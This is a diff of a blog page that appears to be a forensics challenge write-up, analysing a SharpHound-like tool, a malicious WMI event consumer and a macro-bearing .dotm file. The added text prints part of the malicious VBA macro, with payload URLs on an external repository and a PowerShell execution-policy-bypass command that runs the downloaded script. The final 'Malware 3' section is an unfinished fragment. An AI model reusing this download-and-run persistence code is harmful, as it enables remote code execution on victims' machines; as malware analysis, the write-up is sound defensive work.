@@ -220,6 +220,7 @@
         <li><a href="#malware-file-2">Malware File 2</a></li>
       </ul>
     </li>
+    <li><a href="#malware-3">Malware 3</a></li>
   </ul>
 </nav>
  </aside>
@@ -640,7 +641,7 @@ MD5 <span class="o">(</span>result2.exe<span class="o">)</span> <span class="o">
 <p><img src="images/dnspymalware.png" alt="dnspymalware"></p>
 <p>Yeah! It&rsquo;s a .NET application, called <code>SharpHound</code>. By the way, Windows Defender on my Windows 11 VM machine has already deleted it twice, so I had to turn it off for analysis. It&rsquo;s already a bad/good sign (depending on the angle).</p>
 <p>PE Explorer says that it&rsquo;s a 32-bit Windows Console Application. Given the size of the code, it&rsquo;s not packed.</p>
-<p>Thankfully, the author of the malware didn&rsquo;t bother protecting the file and its intents: all function names are pretty self-explanatory: GetDomainControllers(), GetLoggedOnUsersAPI, ProcessLoggedOn, IsSidDomainController, NetWkstaUserEnum etc.</p>
+<p>Thankfully, the author of the malware didn&rsquo;t bother protecting the file and its intents: all function names are pretty self-explanatory: GetDomainControllers(), GetLoggedOnUsersAPI, ProcessLoggedOn, IsSidDomainController, NetWkstaUserEnum etc. Looks like some variation of a BloodHound malware which is hunting down DC and using LDAP.</p>
 <h3 id="malware-file-2">Malware File 2</h3>
 <p>So, from the OBJECTDATA WMI database I&rsquo;ve detected a malicious Event Consumer (LogRotate Consumer - cunning 😉). This revealed that there was a <code>ps1</code> script somewhere on the system, named <code>tmpA7Z2.ps1</code>. I&rsquo;ve used a keyword search option of <code>chainsaw</code> utility and discovered the script itself that got fully logged in several messages, part by part. I&rsquo;ve assembled that script, but the most important data was at the very start: get some encoded and compressed value from the registry key <code>HKU:\\S-1-5-21-3899523589-2416674273-2941457644-1104\\Software\\RegisteredApplications\</code>.</p>
 <p>Here is the code:</p>
@@ -694,6 +695,26 @@ MD5 <span class="o">(</span>result2.exe<span class="o">)</span> <span class="o">
 </code></pre></div><p>However, I couldn&rsquo;t dump it with vol3&rsquo;s dumpfile plugin. I&rsquo;ve decided to utilize vol2 for that (afterall, the developers warned us on the last year OSDFCon that this new version can be buggy for some time). May be it&rsquo;s a bug?</p>
 <p>The difficulty with the vol2 is that I have to manually determine the OS version in order for it to work properly. Since this challenge is quite new, I think it&rsquo;s not Windows XP.</p>
 <p>Recovering the files that were deleted is a tough task for NTFS. The only option is to carve. In case we need a name only or of the contents of the file is small, MFT table can be used. <code>.\MFTECmd.exe -f 'C:\Users\veronicazvereva\Documents\samples\$MFT.copy0' --csv &quot;C:\Users\veronicazvereva\Documents\samples&quot; --csvf &quot;resultsmft.csv&quot;</code>.</p>
+<p>I&rsquo;ve dumped all the <code>dotm</code> files and ran <code>oleid</code> for each. Luckily, there were not too much of these and the first one was my guy:</p>
+<p><img src="images/oleid_supplement.png" alt="oleid_supplement"></p>
+<p>This utility indicated that this file might be malicious since it contains a macro. Let&rsquo;s extract it with <code>olevba file.0xcd8400f25650.0xcd840131b780.DataSectionObject.429D2892.dotm.dat </code> then. This is the summary:</p>
+<p><img src="images/olevba_supplement.png" alt="olevba_supplement"></p>
+<p>And below is the script itself (cropped). In general, it created Event Consumers and stuff and downloaded the <code>tmpA7Z2.ps1</code> script which is responsible for the meterpreter injection into winlogon process. A good question, how could this injection actually happen? I though Windows systems are now very secured from this type of attack.</p>
+<div class="highlight"><pre class="chroma"><code class="language-vb" data-lang="vb"><span class="o">[</span><span class="p">...</span><span class="o">]</span>
+
+<span class="n">xrUrl</span> <span class="o">=</span> <span class="s">&#34;https://raw.githubusercontent.com/xia33F/APT/master/payloads/master_page&#34;</span>
+    <span class="n">xfUrl</span> <span class="o">=</span> <span class="s">&#34;https://raw.githubusercontent.com/xia33F/APT/master/payloads/wrapper_page&#34;</span>
+    <span class="n">xFilePath</span> <span class="o">=</span> <span class="n">Environ</span><span class="p">(</span><span class="s">&#34;APPDATA&#34;</span><span class="p">)</span> <span class="o">&amp;</span> <span class="s">&#34;\Microsoft\Office\Recent\&#34;</span>
+    <span class="n">xFileName</span> <span class="o">=</span> <span class="s">&#34;tmpA7Z2.ps1&#34;</span>
+    <span class="n">xFileFullPath</span> <span class="o">=</span> <span class="n">xFilePath</span> <span class="o">&amp;</span> <span class="n">xFileName</span>
+    <span class="n">xADSName</span> <span class="o">=</span> <span class="s">&#34;secret.txt&#34;</span>
+    <span class="n">xRegKey</span> <span class="o">=</span> <span class="s">&#34;HKEY_USERS\S-1-5-21-3899523589-2416674273-2941457644-1104\Software\RegisteredApplications\AppXs42fd12c3po92dynnq2r142fs12qhvsmyy&#34;</span>
+    
+    <span class="n">PayloadConsumer</span> <span class="o">=</span> <span class="s">&#34;powershell.exe -noP -ep bypass iex -c &#34;&#34;(&#39;&#34;</span> <span class="o">&amp;</span> <span class="n">xFileFullPath</span> <span class="o">&amp;</span> <span class="s">&#34;&#39;)&#34;&#34;&#34;</span>
+
+<span class="o">[</span><span class="p">...</span><span class="o">]</span>
+</code></pre></div><h2 id="malware-3">Malware 3</h2>
+<p>RegisteredApplication key. Doing so avoids the need for applications to modify the system PATH environment variable.</p>
 
   </div>
 </article>
